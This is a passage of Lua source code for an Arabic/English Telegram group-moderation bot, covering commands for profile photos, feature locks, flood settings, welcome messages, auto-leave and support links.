if result.photos_[6] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't have 7 profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '8' then
if result.photos_[7] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't have 8 profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '9' then
if result.photos_[8] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't have 9 profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '10' then
if result.photos_[9] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't have 10 profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ I just can get last 10 profile photos ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙لا يمكنني ان ارسل لك اكثر من 10 صور ", 1, 'md')
end
end
end
end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = pronumb[2]
}, gproen, nil) 
end
----------------------------------HXOUSE TEAM-------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then 
if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
local lockpt = {string.match(text, "^([Ll]ock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local lockptf = {string.match(text, "^(قفل) (.*)$")}
if lockpt[2] == "edit" or lockptf[2] == "التعديل" then
if not hxousedx1:get(HXOUSE..'editmsg'..msg.chat_id_) then
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  التعديل  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 60, string.len(msg.sender_user_id_))
hxousedx1:set(HXOUSE..'editmsg'..msg.chat_id_,true)
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل التعديل سابقا ༯', 1, 'md')
end
end
if lockptf[2] == "الفارسيه" then
if not hxousedx1:get(HXOUSE..'farsi'..msg.chat_id_) then
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الفارسيه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 59, string.len(msg.sender_user_id_))
hxousedx1:set(HXOUSE..'farsi'..msg.chat_id_,true)
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الفارسيه سابقا ༯', 1, 'md')
end
end
if lockptf[2] == "الفارسيه بالطرد" then
if not hxousedx1:get(HXOUSE..'farsiban'..msg.chat_id_) then
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الفارسيه بالطرد  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 66, string.len(msg.sender_user_id_))
hxousedx1:set(HXOUSE..'farsiban'..msg.chat_id_,true)
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الفارسيه بالطرد سابقا ༯', 1, 'md')
end
end
if lockpt[2] == "cmd" or lockptf[2] == "الشارحه" then
if not hxousedx1:get(HXOUSE..'bot:cmds'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock cmd ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  الشارحه  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:cmds'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ cmd is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل الشارحه سابقا ༯', 1, 'md')
end
end
end
if lockpt[2] == "bots" or lockptf[2] == "البوتات" then
if not hxousedx1:get(HXOUSE..'bot:bots:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock bots ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  البوتات  \n⌯︙ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:bots:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ bots is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل البوتات سابقا ༯', 1, 'md')
end
end
end
if lockpt[2] == "bots ban" or lockptf[2] == "البوتات بالطرد" then
if not hxousedx1:get(HXOUSE..'bot:bots:ban'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock bots ban ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  البوتات بالطرد  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 65, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:bots:ban'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ bots is already locked ban ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل البوتات بالطرد سابقا ༯', 1, 'md')
end
end
end
if lockpt[2] == "bots keed" or lockptf[2] == "البوتات بالتقييد" then
if not hxousedx1:get(HXOUSE..'keed_bots'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock bots keed ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  البوتات بالتقييد  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 67, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'keed_bots'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ bots is already locked keed ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل البوتات بالتقييد سابقا ༯', 1, 'md')
end
end
end
if lockpt[2] == "flood" or lockptf[2] == "التكرار" then
if not hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock flood ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  التكرار  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'anti-flood:'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ flood is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل التكرار سابقا ༯', 1, 'md')
end
end
end
if lockpt[2] == "pin" or lockptf[2] == "التثبيت" then
if not hxousedx1:get(HXOUSE..'bot:pin:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Has been lock pin ༯', 1, 'md')
else
local hxouse = '⌯︙ رتبتك : '..tar..' \n⌯︙ تم قفل »  التثبيت  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 58, string.len(msg.sender_user_id_))
end
hxousedx1:set(HXOUSE..'bot:pin:mute'..msg.chat_id_,true)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ pin is already locked ༯', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم قفل التثبيت سابقا ༯', 1, 'md')
end
end
end
end
end
-----------------------------------HXOUSE TEAM------------------------------------------------------------
local text = msg.content_.text_:gsub('ضع تكرار','Setflood')
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etflood (%d+)$") then
local floodmax = {string.match(text, "^([Ss]etflood) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Select a number greater than 2 ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ قم بتحديد تكرار اكبر من 2 ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Flood sensitivity change to '..floodmax[2]..' ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تحديد التكرار للعدد '..floodmax[2]..' في المجموعه ༯', 1, 'md')
end
hxousedx1:set(HXOUSE..'flood:max:'..msg.chat_id_,floodmax[2])
end
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
local text = msg.content_.text_:gsub('ضع التكرار','Setstatus')
if text:match("^[Ss]etstatus (.*)$") then
local status = {string.match(text, "^([Ss]etstatus) (.*)$")}
if status[2] == "kick" or status[2] == "بالطرد" then
if hxousedx1:get(HXOUSE..'floodstatus'..msg.chat_id_) == "Kicked" then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Flood status is *already* on Kicked ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع التكرار بالطرد فعلا 🚏', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Flood status change to *Kicking* ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع التكرار بالطرد 🚏', 1, 'md')
end
hxousedx1:set(HXOUSE..'floodstatus'..msg.chat_id_,'Kicked')
end
end
if status[2] == "del" or status[2] == "بالمسح" then
if hxousedx1:get(HXOUSE..'floodstatus'..msg.chat_id_) == "DelMsg" then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Flood status is *already* on Deleting ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع التكرار بالمسح فعلا🚏', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Flood status has been change to *Deleting* ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع التكرار بالمسح 🚏', 1, 'md')
end
hxousedx1:set(HXOUSE..'floodstatus'..msg.chat_id_,'DelMsg')
end
end
end

if text:match("^ضع الفارسيه (.*)$") then
local status = {string.match(text, "^(ضع الفارسيه) (.*)$")}
if status[2] == "بالتحذير" then
if hxousedx1:get(HXOUSE..'far'..msg.chat_id_) == "thhhh" then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Flood status is *already* on Kicked ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع الفارسيه بالتحذير فعلا 🚏', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Flood status change to *Kicking* ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع الفارسيه بالتحذير 🚏', 1, 'md')
end
hxousedx1:set(HXOUSE..'far'..msg.chat_id_,'thhhh')
end
end
if status[2] == "بدون تحذير" then
if hxousedx1:get(HXOUSE..'far'..msg.chat_id_) == "bedthhh" then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Flood status is *already* on Deleting ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع الفارسيه بدون تحذير فعلا🚏', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Flood status has been change to *Deleting* ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع الفارسيه بدون تحذير 🚏', 1, 'md')
end
hxousedx1:set(HXOUSE..'far'..msg.chat_id_,'bedthhh')
end
end
end
---------------------------------------HXOUSE TEAM--------------------------------------------------------
if (text and text == 'تفعيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Enable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if not hxousedx1:get('HXOUSE:id:photo'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Get id status is *already* on Photo ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع الايدي بالصوره فعلا ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Get ID status has been changed to *Photo* ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع الايدي بالصوره ', 1, 'md')
hxousedx1:del('HXOUSE:id:photo'..msg.chat_id_)
end end end
if (text and text == 'تعطيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Disable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بدون صوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if hxousedx1:get('HXOUSE:id:photo'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Get ID status is *already* on Simple ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع الايدي بدون صوره فعلا ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Get ID status has been change to *Simple* ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع الايدي بدون صوره ', 1, 'md')
hxousedx1:set('HXOUSE:id:photo'..msg.chat_id_,true)
end end end
if (text and text == 'enable id') and is_owner(msg.sender_user_id_, msg.chat_id_)  or (text and text == 'Enable Id') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if not hxousedx1:get('HXOUSE:id:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ID is already enabled  ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ الايدي بالفعل تم تفعيله  ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ID has been enable  ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل الايدي  ', 1, 'md')
hxousedx1:del('HXOUSE:id:mute'..msg.chat_id_)
end end end
if (text and text == 'disable id') and is_owner(msg.sender_user_id_, msg.chat_id_)  or (text and text == 'Disable Id') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if hxousedx1:get('HXOUSE:id:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ID is already disabled  ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ الايدي بالفعل تم تعطيله  ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ID has been disable  ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل الايدي  ', 1, 'md')
hxousedx1:set('HXOUSE:id:mute'..msg.chat_id_,true)
end end end
-------------------------------------HXOUSE TEAM----------------------------------------------------------
if is_sudo(msg) then
local text = msg.content_.text_:gsub('المغادره التلقائيه','Autoleave')
if text:match("^[Aa]utoleave (.*)$") then
local status = {string.match(text, "^([Aa]utoleave) (.*)$")}
if status[2] == "تفعيل" or status[2] == "on" then
if hxousedx1:get(HXOUSE..'autoleave') == "On" then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Auto Leave is now active ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل المغادره التلقائيه فعلا ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Auto Leave has been actived ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل المغادره التلقائيه ', 1, 'md')
end
hxousedx1:set(HXOUSE..'autoleave','On')
end
end
if status[2] == "تعطيل" or status[2] == "off" then
if hxousedx1:get(HXOUSE..'autoleave') == "Off" then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Auto Leave is now deactive ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل المغادره التلقائيه فعلا ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Auto leave has been deactived ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل المغادره التلقائيه ', 1, 'md')
end
hxousedx1:set(HXOUSE..'autoleave','Off')
end
end
end
---------------------------------HXOUSE TEAM--------------------------------------------------------------
local text = msg.content_.text_:gsub('رد الخاص','Clerk')
if text:match("^[Cc]lerk (.*)$") then
local status = {string.match(text, "^([Cc]lerk) (.*)$")}
if status[2] == "تفعيل" or status[2] == "on" then
if hxousedx1:get(HXOUSE..'clerk') == "On" then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Clerk is now active ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل رد خاص البوت فعلا ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Clerk has been actived ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل رد خاص البوت ', 1, 'md')
end
hxousedx1:set(HXOUSE..'clerk','On')
end
end
if status[2] == "تعطيل" or status[2] == "off" then
if hxousedx1:get(HXOUSE..'clerk') == "Off" then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Clerk is now deactive ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل رد الخاص فعلا ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Auto leave has been deactived ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل رد خاص البوت ', 1, 'md')
end
hxousedx1:set(HXOUSE..'clerk','Off')
end
end
end
end
---------------------------------------------HXOUSE TEAM--------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etlink$") or text:match("^ضع رابط$")  and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Plese send your group link now :', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ارسل رابط المجموعه ليتم حفضه 📥 ', 1, 'md')
end
hxousedx1:set(HXOUSE.."bot:group:link"..msg.chat_id_, 'waiting')
end
------------------------------------HXOUSE TEAM-----------------------------------------------------------
if text:match("^الدعم$") or text:match("^المطور$") and hxouse11(msg) then
local link = hxousedx1:get(HXOUSE.."bot:supports:link")
if link then
if link:match("https://") then
if hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ <b>Support Link</b> :\n\n " .. link, 1, "html")
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم ارسال بياناتك للمطور \n⌯︙ عند رؤية الرسالة سيأتي\n⌯︙ يمكنك طلب المساعدة من كروب الدعم \n⌯︙ رابط كروب دعم البوت \nٴ… … … … … … … … … … …➖\n " .. link, 1, "html")
end
elseif hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ <b>Support Bot ID</b> : @" .. link, 1, "html")
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم ارسال بياناتك للمطور \n⌯︙ عند رؤية الرسالة سيأتي\n⌯︙ يمكنك طلب المساعدة من كروب الدعم \n⌯︙ بوت تواصل المطور \nٴ… … … … … … … … … … …➖\n @" .. link, 1, "html")
end
elseif hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ *Support link* is not found ", 1, "md")
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لم يتم تعيين دعم ارسل لي (ضع دعم) واتبع التعليمات ', 1, 'md')
end
end
-------------------------------

----------------------------------------HXOUSE TEAM-------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ww]elcome on$") or text:match("^تفعيل الترحيب$") and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, ' ⌯︙  Welcome activated  ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل الترحيب ', 1, 'md')
end
hxousedx1:set(HXOUSE.."bot:welcome"..msg.chat_id_,true)
end
if text:match("^[Ww]elcome off$") or text:match("^تعطيل الترحيب$") and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Welcome deactivated ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل الترحيب ', 1, 'md')
end
hxousedx1:del(HXOUSE.."bot:welcome"..msg.chat_id_)
end
if text:match("^ضع ترحيب (.*)$")  then
local welcome = {string.match(text, "^(ضع ترحيب) (.*)$")}
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Welcome text has been saved \n\n⌯︙  Welcome text :\n\n'..welcome[2], 1, 'html')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حفض الترحيب \n\n⌯︙ الترحيب هو  :\n\n'..welcome[2], 1, 'md')
end
hxousedx1:set(HXOUSE..'welcome:'..msg.chat_id_,welcome[2])
end
if text:match("^[Dd]el welcome$") or text:match("^حذف الترحيب$") and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Welcome text has been removed ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حذف الترحيب ', 1, 'md')
end
hxousedx1:del(HXOUSE..'welcome:'..msg.chat_id_)
end
if text:match("^[Gg]et welcome$") or text:match("^جلب الترحيب$") then
local wel = hxousedx1:get(HXOUSE..'welcome:'..msg.chat_id_)
if wel then
hxousedx(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Welcome text not found ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لم يتم وضع الترحيب ', 1, 'md')
end
end
end
end
--------------------------------------------HXOUSE TEAM---------------------------------------------------
if is_sudo(msg) then
local text = msg.content_.text_:gsub('ضع رد الخاص','Set clerk')
if text:match("^[Ss]et clerk (.*)$") then
local clerk = {string.match(text, "^([Ss]et clerk) (.*)$")}
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Clerk text has been saved \n⌯︙ Welcome text :\n\n'..clerk[2], 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعيين رد الخاص للبوت \n\n⌯︙ رد خاص البوت هو :\n\n'..clerk[2], 1, 'md')
end
hxousedx1:set(HXOUSE..'textsec',clerk[2])
end
if text:match("^[Dd]el clerk$") or text:match("^حذف رد الخاص$") then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Clerk text has been removed ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حذف رد الخاص ',1, 'md')
end
hxousedx1:del(HXOUSE..'textsec')
end
if text:match("^[Gg]et clerk$") or text:match("^جلب رد الخاص$") then
local cel = hxousedx1:get(HXOUSE..'textsec')
if cel then
hxousedx(msg.chat_id_, msg.id_, 1, cel, 1, 'md')
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Clerk text not found ', 1, 'md')
else
